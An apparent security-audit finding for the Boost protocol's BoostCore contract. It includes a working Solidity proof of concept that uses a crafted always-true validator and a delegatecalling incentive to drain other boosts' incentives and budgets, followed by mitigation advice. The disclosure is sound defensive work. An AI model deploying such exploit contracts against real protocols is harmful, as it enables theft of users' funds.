# HIGH-02 - Any user that has access to createBoost can drain funds from any budget or any incentives.

### Summary

Any user authorized to call `BoostCore::createBoost()` can create a crafted boost 
that allows him to drain funds from budgets and incentives through `BoostCore::claimIncentivesFor()`.

### Impact

If a boost is created with an action that inherits `AValidator` and can make `validate()` to return always 
true bypassing [this line](https://github.com/sherlock-audit/2024-06-boost-aa-wallet/blob/main/boost-protocol/packages/evm/contracts/BoostCore.sol#L176). 
Then on the following [line](https://github.com/sherlock-audit/2024-06-boost-aa-wallet/blob/main/boost-protocol/packages/evm/contracts/BoostCore.sol#L177),the `claim()` can call a crafted function deployed as an incentive that `delegatescall` to other contracts. As `msg.sender` will remain as `BoostCore`, all incentives methods under `onlyOwner` are able to be called. Specifically, calling `clawback()` will allow someone to drain any incentives funds. Also budgets, 
can be drain as long as `BoostCore` is allowed to call `budget.disburse()` or `budget.clawback()`.


### PoC

In the following example, a crafted incentive called `ExploitIncentive` is deployed
with the following logic in `claim()`:

```solidity
    /// @notice Claim the incentive
    /// @param claimTarget the address receiving the claim
    /// @return True if the incentive was successfully claimed
    function claim(address claimTarget, bytes calldata _data) external override onlyOwner returns (bool) {
      bytes memory encodedFunctionCall = abi.encodeWithSignature("clawback(bytes)", _data);
      claimTarget.delegatecall(encodedFunctionCall);
      return true;
    }
```

Also, a crafted action is deployed called `ExploitAction` bypassing `validate()`: 
```solidity
contract ExploitAction is AContractAction, AValidator {
    /// @inheritdoc ACloneable
    /// @notice Initialize the contract with the owner and the required data
    function initialize(bytes calldata data_) public virtual override initializer {
        _initialize(abi.decode(data_, (InitPayload)));
    }

    function _initialize(InitPayload memory init_) internal virtual onlyInitializing {
        chainId = init_.chainId;
        target = init_.target;
        selector = init_.selector;
        value = init_.value;
    }
    /// @inheritdoc AContractAction
    function getComponentInterface() public pure virtual override(AContractAction, AValidator) returns (bytes4) {
        return type(AERC721MintAction).interfaceId;
    }

    /// @inheritdoc AContractAction
    function supportsInterface(bytes4 interfaceId)
        public
        view
        virtual
        override(AContractAction, AValidator)
        returns (bool)
    {
        return interfaceId == type(AERC721MintAction).interfaceId || super.supportsInterface(interfaceId);
    }
    function validate(uint256, /*unused*/ uint256, /* unused */ address, /*unused*/ bytes calldata data_)
        external
        virtual
        override
        returns (bool success)
    {
      return true;
    }
}

```

Finally, crafted `boost` is deployed to drain incentives.
```solidity
    function testCreateBoost_ExploitIncentives() public {
    
        BoostLib.Boost memory boost1 = boostCore.createBoost(validCreateCalldata);

        BoostLib.Target[] memory incentives = new BoostLib.Target[](1);
        incentives[0] = BoostLib.Target({
          isBase: true,
          instance: address(new ExploitIncentive()),
          parameters: abi.encode(
            ERC20Incentive.InitPayload({
              asset: address(mockERC20),
              strategy: AERC20Incentive.Strategy.POOL,
              reward: 1 ether,
              limit: 100
            })
          )
        });

        mockERC20.mint(address(this), 100 ether);
        mockERC20.approve(address(budget), 100 ether);
        budget.allocate(
            abi.encode(
                ABudget.Transfer({
                    assetType: ABudget.AssetType.ERC20,
                    asset: address(mockERC20),
                    target: address(this),
                    data: abi.encode(ABudget.FungiblePayload({amount: 100 ether}))
                })
            )
        );

        
        bytes memory createData = LibZip.cdCompress(
            abi.encode(
                BoostCore.InitPayload({
                    budget: budget,
                    action: BoostLib.Target({
                          isBase: true,
                          instance: address(new ExploitAction()),
                          parameters: abi.encode(
                              AContractAction.InitPayload({chainId: block.chainid, target: address(0), selector: "", value: 0})
                          )
                    }),
                    validator: BoostLib.Target({isBase: true, instance: address(0), parameters: ""}),
                    allowList: allowList,
                    incentives: incentives,
                    protocolFee: 500, // 5%
                    referralFee: 1000, // 10%
                    maxParticipants: 10_000,
                    owner: address(1)
                })
            )
        );
        BoostLib.Boost memory boost2 = boostCore.createBoost(createData);
      
        bytes memory payload = 
            abi.encode(AIncentive.ClawbackPayload({target: address(2), data: abi.encode(50 ether)}));
        // @audit - Take a look here we use our crafted boost2 to drain boost1.incentives[0]
        // but this could be repeated for budgets as long as BoostCore can call the methods.
        boostCore.claimIncentiveFor{value: 0.000075 ether}(1, 0, address(0), payload , address(boost1.incentives[0]));

    }

```


### Mitigation

Consider restricting access to `incentives.clawback()`, `budget.clawback()` and `budget.disburse()`
from `BoostCore` calls and implement a manager role that is allowed to execute those functions. 
Budget implements `accessControls` for a manager role, but incentives 
do not, they are only callable by `onlyOwner` which is `BoostCore` due to initialization. 
Consider adding a manager role for `incentives` that can execute those functions.
